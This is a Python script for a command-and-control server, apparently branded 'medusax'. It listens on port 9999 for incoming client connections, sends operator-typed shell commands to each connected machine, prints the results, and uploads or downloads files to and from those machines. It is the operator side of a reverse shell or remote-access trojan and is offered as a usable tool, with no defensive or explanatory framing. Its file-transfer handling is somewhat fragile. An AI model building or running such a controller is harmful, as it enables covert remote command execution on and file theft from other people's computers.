import socket
import threading
import os

# Server setup
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 9999

# Client handler function
def handle_client(client_socket):
    while True:
        # Display a command prompt
        command = input("admin@medusax~$ ")

        # Send the command to the client
        client_socket.send(command.encode())

        # If command is 'exit', break the loop and close the connection
        if command.lower() == 'exit':
            print("Closing connection with client.")
            client_socket.close()
            break

        # Receive response from the client
        response = client_socket.recv(4096).decode()
        print(response)

        # Handle file upload and download commands
        if command.startswith("upload"):
            filename = command.split()[1]
            upload_file(client_socket, filename)
        elif command.startswith("download"):
            filename = command.split()[1]
            download_file(client_socket, filename)

# File upload function
def upload_file(client_socket, filename):
    file_size = os.path.getsize(filename)
    client_socket.send(f"upload {filename} {file_size}".encode())

    with open(filename, "rb") as f:
        client_socket.send(f.read())

    print(f"File {filename} uploaded successfully.")

# File download function
def download_file(client_socket, filename):
    client_socket.send(f"download {filename}".encode())

    file_size = int(client_socket.recv(4096).decode())
    with open(f"{filename}", "wb") as f:
        data = client_socket.recv(file_size)
        f.write(data)

    print(f"File {filename} downloaded successfully.")

# Start the server
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((SERVER_HOST, SERVER_PORT))
    server.listen(5)
    print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[+] Connection from {addr} has been established.")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    start_server()
